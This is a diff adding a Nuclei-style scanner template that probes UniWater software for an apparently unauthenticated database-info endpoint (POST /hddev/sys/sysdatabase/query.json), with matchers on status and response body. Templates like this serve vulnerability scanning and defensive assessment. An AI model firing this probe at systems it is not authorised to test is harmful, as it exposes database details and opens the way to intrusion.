@@ -1,0 +1,26 @@
+id: UniWater-query-sqlinfo
+info:
+  name: UniWater-query-sqlinfo
+  author: lemonlove7
+  severity: high
+http:
+  - raw:
+      - |-
+        POST /hddev/sys/sysdatabase/query.json HTTP/1.1
+        Host: {{Hostname}}
+        Content-Length: 23
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
+        Accept: application/json, text/plain, */*
+        Content-Type: application/json;charset=UTF-8
+        Connection: keep-alive
+        
+        {"index":1,"size":100}
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"created":null'
+    matchers-condition: and
